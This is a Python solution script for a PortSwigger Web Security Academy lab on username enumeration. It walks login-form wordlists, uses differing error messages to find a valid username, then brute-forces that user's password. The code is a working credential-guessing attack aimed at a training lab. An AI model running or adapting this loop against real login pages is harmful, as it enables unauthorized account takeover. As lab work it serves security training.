#!/usr/bin/env python

from bs4 import BeautifulSoup
import getpass
import requests


# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
# Lab: Username enumeration via different responses
# APPRENTICE
# This lab is vulnerable to username enumeration and password brute-force
# attacks. It has an account with a predictable username and password,
# which can be found in the following wordlists:

# Candidate usernames:
# https://portswigger.net/web-security/authentication/auth-lab-usernames

# Candidate passwords:
# https://portswigger.net/web-security/authentication/auth-lab-passwords

# The candidate usernames and passwords are saved in usernames.txt and
# passwords.txt.

# To solve the lab, enumerate a valid username, brute-force this user's
# password, then access their "My account" page.


base_url = "https://portswigger.net"
login_url = "{base_url}/users".format(base_url=base_url)
lab_url = "https://YOURLABID.web-security-academy.net"


def login(email: str, password: str) -> requests.Session:
    """Log in to PortSwigger."""
    session = requests.Session()
    r = session.get(login_url)
    login_page = BeautifulSoup(r.text, features="html.parser")
    token_id = "__RequestVerificationToken"
    token_field = login_page.find(id=token_id)
    token = token_field.get("value")
    data = {
        token_id: token,
        "EmailAddress": email,
        "Password": password,
        "RememberMe": "false",
        "ajaxRequest": "true",
    }
    session.post(login_url, data=data)
    return session


def get_username(session: requests.Session) -> str:
    """Get username by brute force with wordlist."""
    login_url = "{lab_url}/login".format(lab_url=lab_url)
    r = session.get(login_url)
    login_page = BeautifulSoup(r.text, features="html.parser")
    csrf_token = login_page.find("input", {"name": "csrf"}).get("value")
    with open("usernames.txt") as f:
        for line in f.readlines():
            username = line.strip()
            data = {
                "csrf": csrf_token,
                "username": username,
                "password": "password",
            }
            r = session.post(login_url, data=data)
            if "Invalid username" not in r.text:
                return username
    return "<unknown>"


def get_password(username: str, session: requests.Session) -> str:
    """Get password by brute force with wordlist."""
    login_url = "{lab_url}/login".format(lab_url=lab_url)
    r = session.get(login_url)
    login_page = BeautifulSoup(r.text, features="html.parser")
    csrf_token = login_page.find("input", {"name": "csrf"}).get("value")
    with open("passwords.txt") as f:
        for line in f.readlines():
            password = line.strip()
            data = {
                "csrf": csrf_token,
                "username": username,
                "password": password,
            }
            r = session.post(login_url, data=data)
            if "Incorrect password" not in r.text:
                return password
    return "<unknown>"


email = input("Email address: ")
password = getpass.getpass("Password: ")
session = login(email, password)
username = get_username(session)
password = get_password(username, session)
print("Found lab credentials.")
print("Username:", username)
print("Password:", password)
print("Log into the lab and access the user's 'My Account' page.")
